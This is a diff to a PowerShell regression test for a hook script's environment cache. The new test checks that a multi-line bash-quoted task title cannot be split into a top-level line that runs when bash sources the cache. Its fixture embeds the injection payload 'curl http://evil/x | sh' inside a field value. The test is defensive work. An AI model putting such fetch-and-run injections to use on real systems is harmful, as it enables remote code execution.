@@ -4741,7 +4741,8 @@ Write-Host "=== Test Group 22: W2101 per-task record layer ==="
 
 $g22Want = @(
     'ConvertTo-ShSingleQuoted', 'Get-TaskRecordKey', 'Get-TaskBaseRefKey', 'Get-TaskHeadRefKey',
-    'Get-TaskOwnedKey', 'Get-TaskBaseAtKey', 'Get-TaskNarrowedKey', 'Get-EnvCacheLine', 'Read-TaskRecord',
+    'Get-TaskOwnedKey', 'Get-TaskBaseAtKey', 'Get-TaskNarrowedKey', 'Get-EnvCacheLine',
+    'Split-EnvCacheRecord', 'Read-TaskRecord',
     'Get-TaskOwnedRecord', 'Get-TaskBaseAtRecord', 'Get-TaskNarrowedRecord',
     'Get-TaskBaseRefFor', 'Get-TaskHeadRefFor', 'Set-TaskRecord', 'Set-TaskOwnedRecord',
     'Set-TaskNarrowedRecord', 'Set-TaskHeadRefRecord', 'Set-TaskBaseAtRecord',
@@ -5853,6 +5854,73 @@ if ($g23Bash) {
         "$($g23BpValue -cmatch ""^'[^']*'\z"")"
 } else {
     Write-Host "  SKIP: 23i2: the shape-gate bypass probe needs bash" -ForegroundColor Yellow
+}
+
+# --- 23j: a filter must not DISMEMBER a multi-line record ---
+# The round-3 hole, one layer above 23h. There the reader manufactured a record
+# from a CR; here the FILTER takes a legitimately multi-line bash-authored
+# record apart. Set-HookEnv drops lines whose key it is rewriting and keeps the
+# rest — so given `TASK_TITLE='Fix<LF>curl evil | sh<LF>y'`, a line-oriented
+# filter drops the opening line and KEEPS the interior, and Write-EnvCache
+# re-joins the survivors, PROMOTING `curl evil | sh` to a top-level cache line
+# that bash executes on the next `. "$ENV_CACHE"` under set -a.
+#
+# Both legs matter: the record must survive when kept, and vanish ENTIRELY when
+# dropped. A filter that drops only the opening line is the vulnerability.
+if ((Get-Command git -ErrorAction SilentlyContinue) -and $g23Bash) {
+    foreach ($leg in @(
+        @{ Name = 'dropped'; Env = @{ TASK_TITLE = 'Replaced' } },
+        @{ Name = 'kept';    Env = @{ BOARD_NAME = 'Board' } }
+    )) {
+        $g23DmProj = New-GitRepo -Name "g23-dismember-$($leg.Name)"
+        $g23DmCache = Join-Path $g23DmProj '.stride-env-cache'
+        # Exactly what bash writes for a multi-line title: ONE sq_escaped
+        # assignment spanning three physical lines, inert to its own source.
+        [System.IO.File]::WriteAllText($g23DmCache,
+            "TASK_TITLE='Fix`ncurl http://evil/x | sh`ny'`nTASK_ID='42'`n",
+            (New-Object System.Text.UTF8Encoding($false)))
+        $g23DmInput = Build-AfterGoalInputFull `
+            -PrimaryCommand 'curl -X PATCH https://stride.example.com/api/tasks/99/complete' `
+            -Inner @{ data = @{ id = 99; parent_id = 55 }
+                      hooks = @(@{ name = 'before_review'; env = $leg.Env }) }
+        $r = Invoke-HookScript -InputJson $g23DmInput -Phase 'post' -ProjectDir $g23DmProj
+        Assert-Exit "23j [$($leg.Name)]: a re-emit over a multi-line record exits 0" 0 $r.ExitCode
+        $g23DmRaw = (New-Object System.Text.UTF8Encoding($false)).GetString(
+            [System.IO.File]::ReadAllBytes($g23DmCache))
+        $g23DmLines = @($g23DmRaw -split "`n" | Where-Object { $_ -ne '' })
+        # The two legs assert DIFFERENT things, and conflating them is a
+        # mistake worth naming: when the record is KEPT its interior is still a
+        # physical line, because that is exactly what a multi-line quoted value
+        # looks like on disk. What must never happen is that interior becoming
+        # a line in its own right - i.e. outside the quoting - which is only
+        # observable when the record's opening line was dropped.
+        if ($leg.Name -eq 'dropped') {
+            Assert-Eq "23j [dropped]: the whole record goes, interior included - no promotion" "0" `
+                "$(@($g23DmLines | Where-Object { $_ -eq 'curl http://evil/x | sh' }).Count)"
+        } else {
+            # Kept: the record must survive WHOLE. bash reading its own value
+            # back is the check that it is still one quoted assignment rather
+            # than three lines that happen to sit together.
+            $g23DmTitle = (& bash -c '. "$1" > /dev/null 2>&1; printf %s "$TASK_TITLE"' _ $g23DmCache 2>$null | Out-String)
+            Assert-Eq "23j [kept]: the multi-line record survives as ONE value" "True" `
+                "$($g23DmTitle -like '*curl http://evil/x | sh*' -and $g23DmTitle -like 'Fix*')"
+        }
+        # Either way the interior must not be EXECUTED when bash sources it.
+        # The probe is a real command substitution: if the interior were ever a
+        # top-level line, this marker would appear.
+        $g23DmMarker = Join-Path $TmpDir "g23-dm-marker-$($leg.Name)"
+        Remove-Item -Force $g23DmMarker -ErrorAction SilentlyContinue
+        [System.IO.File]::WriteAllText($g23DmCache,
+            ((New-Object System.Text.UTF8Encoding($false)).GetString([System.IO.File]::ReadAllBytes($g23DmCache)) -replace
+                'curl http://evil/x \| sh', ('touch ' + $g23DmMarker)),
+            (New-Object System.Text.UTF8Encoding($false)))
+        $null = (& bash -c '. "$1" > /dev/null 2>&1' _ $g23DmCache 2>$null | Out-String)
+        Assert-Eq "23j [$($leg.Name)]: and sourcing the cache executes nothing" "False" `
+            "$(Test-Path $g23DmMarker)"
+        Remove-Item -Force $g23DmMarker -ErrorAction SilentlyContinue
+    }
+} else {
+    Write-Host "  SKIP: 23j: the dismemberment test needs git and bash" -ForegroundColor Yellow
 }
 
 # --- 23e: a ps1-written cache is readable by bash's STRICT record grep ---
